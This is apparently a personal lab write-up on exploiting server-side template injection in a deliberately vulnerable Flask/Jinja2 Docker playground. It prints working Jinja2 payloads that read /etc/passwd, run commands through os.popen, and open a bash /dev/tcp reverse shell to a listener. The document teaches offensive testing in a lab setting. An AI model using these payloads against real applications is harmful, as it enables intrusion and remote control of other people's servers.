# Definition
Something to do!!
## Installing and Preparing lab
I will be using [SSTI-flak-hacking-playground](https://github.com/filipkarc/ssti-flask-hacking-playground) docker lab.
```shell
docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground
docker ps
```
___
# Attacking
## Understanding
Now, opening our web browser and entering http://localhost:8089, we should see this web page.
![[Pasted image 20230719192406.png]]
___
We can note that this webpage uses a *Template* to present content dynamically.
![[Pasted image 20230719192643.png]]
___
## Hacking
We are going to start scanning *Technologies* used in this webpage by using **whatweb** tool.
You will see that web uses *Python*.
```shell
whatweb "http://127.0.0.1:8089/"
```
![[Pasted image 20230719192951.png]]
___
### Verifying SSTI
First, you should verify if the web presents **SSTI** vulnerability.
So, let's try putting a basic *Python* math operation.
```Python
{{7*7}}
```
![[Pasted image 20230719193512.png]]
![[Pasted image 20230719193549.png]]
___
Also you can try out another *Python* operation, like this.
```Python
{{'7'*7}}
```
![[Pasted image 20230719193840.png]]
___
### Reading Sensitive Files
Now that we have been able to verify the existence of this SSTI vulnerability, we could use a lot of *Payloads* in the web like [Payloads All The Things - SSTI - Python Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) and try out something like this.
```Python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```
This code accesses the **/etc/passwd** file through a Python function and attributes and then reads the entire contents of the file.
![[Pasted image 20230719194950.png]]
___
### Doing an RCE
As attackers we wish to execute commands right? You can do it by using another payload, **Exploit the SSTI by calling os.popen().read()**, from *Payloads All The Things*.
```Python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
![[Pasted image 20230719195942.png]]
___
To do it more dangerous, we could deploy a *netcat* listener to obtain a **Reverse Shell** from thwe victim along with the basic RS one liner.
```bash
bash -c "bash -i >%26 /dev/tcp/172.17.0.1/4646 0>%261"
```
And in the web browser URL.
```Bash
http://localhost:8089/?user={{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >%26 /dev/tcp/172.17.0.1/4646 0>%261"').read() }}
```
![[Pasted image 20230719200748.png]]
___